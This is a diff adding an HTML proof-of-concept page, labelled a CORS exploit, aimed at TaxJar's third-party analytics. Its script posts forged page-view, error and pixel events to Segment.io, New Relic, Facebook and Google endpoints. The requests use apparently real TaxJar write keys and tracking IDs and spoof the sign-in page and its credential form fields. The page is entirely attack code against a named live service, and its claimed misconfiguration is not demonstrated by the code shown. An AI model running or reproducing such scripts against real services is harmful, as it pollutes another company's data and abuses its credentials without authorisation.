@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🔥 CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>Proof of CORS Misconfig (TaxJar 3rd-Party Leak)</h2>
+
+  <script>
+    // 1. Segment.io PoC
+    fetch("https://api.segment.io/v1/p", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({
+        type: "page",
+        anonymousId: "exploit-session",
+        context: { page: { url: "https://app.taxjar.com/sign_in" }},
+        writeKey: "jPW0Udoiicg5iccClHsBoWgjNoBdwd8N"
+      })
+    })
+    .then(res => res.text())
+    .then(data => document.body.innerHTML += `<h3>Segment.io</h3><pre>${data}</pre>`);
+
+    // 2. New Relic PoC
+    fetch("https://bam.nr-data.net/jserrors/1/9603b1ae43?a=1788690&v=1.292.0", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({
+        sm: [{ params: { name: "Generic/Test/X-Origin" }, stats: { c: 1 } }]
+      })
+    })
+    .then(res => res.blob())
+    .then(() => document.body.innerHTML += `<h3>New Relic</h3><p>Success</p>`);
+
+    // 3. Facebook Pixel PoC
+    const formData = new FormData();
+    formData.append("id", "374982569515249");
+    formData.append("ev", "SubscribedButtonClick");
+    formData.append("dl", "https://app.taxjar.com/sign_in");
+    formData.append("rl", "https://app.taxjar.com/");
+    formData.append("cd[formFeatures]", JSON.stringify([
+      { name: "session[email]", inputType: "email" },
+      { name: "session[password]", inputType: "password" }
+    ]));
+
+    fetch("https://www.facebook.com/tr/", {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.text())
+    .then(data => document.body.innerHTML += `<h3>Facebook Pixel</h3><pre>${data}</pre>`);
+
+    // 4. Google Tag Manager PoC
+    fetch("https://www.google.com/ccm/collect?tid=AW-975686394&en=page_view&dl=https%3A%2F%2Fapp.taxjar.com%2Faccount", {
+      method: "POST"
+    })
+    .then(res => res.text())
+    .then(data => document.body.innerHTML += `<h3>Google Tag</h3><pre>${data}</pre>`);
+  </script>
+</body>
+</html>
